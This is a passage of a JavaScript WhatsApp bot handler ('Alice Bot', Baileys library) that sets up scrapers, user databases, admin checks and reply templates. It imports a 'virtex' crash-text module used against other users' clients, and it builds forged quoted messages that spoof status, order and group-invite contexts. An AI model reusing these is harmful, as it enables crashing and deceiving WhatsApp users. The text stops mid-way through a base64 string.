// USING BASE FROM GITHUB
// Developed by Darwin


// HOOK SETTING & FUNCTION
require('./settings');
require('./lib/funclist');
require('./assets/command')
require('./system/functions');
// MODULE
const baileys = global.baileys
const { BufferJSON, WA_DEFAULT_EPHEMERAL, MessageType, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage } = global.baileys
const fs = require('fs')
const fg = require('api-dylux')
const toMs = require('ms')
const util = require('util')
const BASE_URL = 'https://aemt.me'
const FormData = require('form-data')
const cheerio = require('cheerio')
const bochil = require('@bochilteam/scraper')
const client = require('filestack-js').init(fileStackApi)
const chalk = require('chalk')
const crypto = require('crypto')
const { exec, spawn, execSync } = require('child_process')
const axios = require('axios')
const path = require('path')
const os = require('os')
//const { Client, LocalAuth, MessageMedia } = require('whatsapp-web.js');
const jsobfus = require('javascript-obfuscator');
const speed = require('performance-now')
const moment = require('moment-timezone')
const cron = require('node-cron')
const ms = require('parse-ms')
const rimraf = require('rimraf')
const jimp = require('jimp')
const fetch = require('node-fetch')
const { sizeFormatter } = require('human-readable')
const yts = require('yt-search');
const ffmpeg = require('fluent-ffmpeg')
const ytdl = require('ytdl-core');
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require('dhn-api')
const Harinih = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
const Kalender91 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)

// LIBRARY - LIB
const { color, bgcolor, mycolor } = require('./lib/color')
const { pinterest } = require("./lib/pinterest")
const anon = require('./lib/menfess')
const scp2 = require('./lib/scraper2')
const photooxy = require('./lib/photooxy');
const { TelegraPh } = require('./lib/uploader')
const _prem = require("./lib/premium");
const _sewa = require("./lib/sewa");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { addRespons, checkRespons, deleteRespons } = require('./lib/respon');
const {getId,changeId,makeGetRequest,scrapeData} = require("./lib/get");
const { webp2mp4File } = require("./lib/convert");
const { toAudio,toPTT,toVideo,addExifAvatar } = require('./lib/converter')
const { mediafireDl } = require('./lib/mediafire.js')
const { UploadFileUgu, floNime } = require('./lib/uploader')
const { savefromV2, ChatGpt, searchfilm,getSurah, tafsir, instagram4, capcutdl, mediafiredll, instagram2, instagram3, cekkuota, tele, ytPlayMp4, ytPlayMp3, textpro,igdl, kodepos, mediafire, ffstalk, mlstalk, Tiktok, surah, listsurah, ephoto, emoji} = require('./lib/scraper') 
const {toFirstCase,isNumber,formatp,parseMention, resize, getRandom,generateProfilePicture, getCase, runtime, FileSize, h2k, getRandomFile, makeid, kyun, randomNomor, jsonformat, isUrl, fetchJson, sleep, getBuffer,} = require("./lib/myfunc");


// CLONE BOT UTAMA
const { startbot, stopjadibot } = require('./system/start')



// DATABASE GLOBAL USER
const users = global.db.users
const listall = global.db.listall
const stickercmd = global.db.stickercmd
const AntiSpam = global.db.antispam
const spammer = []



// FUNCTION SALDO & DATA
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./database/deposit")
let db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
// BATAS SALDO

// EXPORT MODULE/HOOK FUNCTION
module.exports = async(alice, m, update, store, jid, setting) => {
const { limitCount } = global.limit
const { pushname, botNumber, content, senderNumber, from, fromMe, isGc, sender, isBaileys, type } = m
if (m.key && m.key.remoteJid === 'status@broadcast') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
try {
if (m.key && m.key.remoteJid === 'status@broadcast') return;

// SYSTEM HOOK
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'stickerMessage' && stickercmd[m.message.stickerMessage.fileSha256.toString('base64')] !== undefined) ? stickercmd[m.message.stickerMessage.fileSha256.toString('base64')].text : '.'
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.' // di string '' kasih '.' sebelumnya, guna untuk hanya owner yang tidak mengenakan prefix dan pengguna lain menggunakan prefix titik
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const args = body.trim().split(/ +/).slice(1)
const isGroup = m.key.remoteJid.endsWith('@g.us')
const isPc = from.endsWith('@s.whatsapp.net')
const pushname = m.pushName || 'No Name'
const botNumber = alice.user.id.split(':')[0]+'@s.whatsapp.net'
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const isCreator = global.owner.includes(m.sender)
const isOwner = global.owner.includes(m.sender) || (users[m.sender] !== undefined ? users[m.sender].owner : false)

const command = isOwner ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
const comand = prefix + command;
const text = args.join(' '), q = args.join(' ');
const quoted = m.quoted ? m.quoted : m;
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const qm = (m.quoted || m)
const _quoted = (qm.type == 'buttonsMessage') ? qm[Object.keys(qm)[1]] : (qm.type == 'templateMessage') ? qm.hydratedTemplate[Object.keys(qm.hydratedTemplate)[1]] : (qm.type == 'product') ? qm[Object.keys(qm)[0]] : m.quoted ? m.quoted : m
const qmsg = (_quoted.msg || _quoted)


// DATABASE RPG GAMES
const { ngazap } = require ('./assets/virtex/ngazap')
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");



// BATAS RPG


// FUNCTION WAKTU
let d = new Date
let gmt = new Date(0).getTime() - new Date('1 Januari 2023').getTime()
const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString('id', { weekday: 'long' })
const calender = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const timestampp = speed();
const latensi = speed() - timestampp
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const salam = 'Selamat '+dt.charAt(0).toUpperCase() + dt.slice(1)
    
    
// GROUP METADATA
const groupMetadata = m.isGroup ? await alice.groupMetadata(m.chat) :''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter((v) => v.admin !== null).map((i) => i.id) : [] || [];
const groupOwner = m.isGroup ? groupMetadata?.owner : false;
const groups = global.db.groups[m.chat] !== undefined ? global.db.groups[m.chat] : false;
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;


// REGISTER BOT
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
const isRegistered = checkRegisteredUser(m.sender)

// AMBIL PP USER
try {
var ppuser = await alice.profilePictureUrl(m.sender, 'image')} catch (err) {
let ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'}
let ppnyauser = await getBuffer(ppuser)
let ppUrl = await alice.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
    	  

// AUTO SAVE DATABASE
const isBanned = db.users[sender] !== undefined ? db.users[sender].banned : false
const isPremium = _prem.checkPremiumUser(m.sender, premium)
const isNumber = x => typeof x === 'number' && !isNaN(x)
try {
let user = db.users[sender]
if (user) {
if (typeof user !== 'object') db.users[sender] = {}
if (!('jid' in user)) user.jid = sender
if (!('name' in user)) user.name = pushname
if (!('date' in user)) user.date = calender
if (!isNumber(user.limit)) user.limit = 15
if (!isNumber(user.balance)) user.balance = 10000
if (!('banned' in user)) user.banned = false
if (!('premium' in user)) user.premium = false
if (!isNumber(user.expired)) user.expired = Date.now() + toMs('7d')
} else db.users[sender] = {
jid: sender,
name: pushname,
date: calender,
limit: 15,
balance: 10000,
banned: false,
premium: false,
expired: Date.now() + toMs('7d')
}
} catch (err) {
console.error(err)
}


// FANGSIEN MENTION
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
const tag = `@${m.sender.split('@')[0]}`
const taggc = `@${from.split('@')[0]}`




// FUNCTION SELF
const Cuekin = !0;

// FUNCTION REACT BY DARWIN
let reactionMessage = baileys.proto.Message.ReactionMessage.create({ key: m.key, text: "" })


// READ MORE/BACA SELENGKAPNYA
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

// GET QUOTES ANIME
const resis = await Quotes()

// FUNCTION NOMOR USER
const nomore = m.sender.replace(/[^0-9]/g, '')

// FUNCTION PASSWORD
const pw = crypto.randomBytes(5).toString('hex')


// REPLY API
const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}
// REPLY CUSTOM TEXT
const menfes ={key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"} : {})}, message: {extendedTextMessage: {text: `${resis.quotes}`}}}
// REPLY WITH TROLI
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: ppnyauser, surface: 200, message: 'Alice Bot', orderTitle: 'By Alicezation', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
// REPLY WITH DOCUMENT
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: 'Project Alice',jpegThumbnail: ppnyauser}}}
//REPLY WITH VN
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
// REPLY WITH GIFT
const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title": 'Alice Project', "h": 'Alice','seconds': '359996400', 'gifPlayback': 'true', 'caption': 'Alice Zuberg', 'jpegThumbnail': ppnyauser}}}
// REPLY WITH GROUP LINK
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "Project Alice", "caption": `${pushname}`, 'jpegThumbnail': ppnyauser}}}
// REPLY WITH VIDEO
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title": 'Project Alice', "h": 'Alice Bot','seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': "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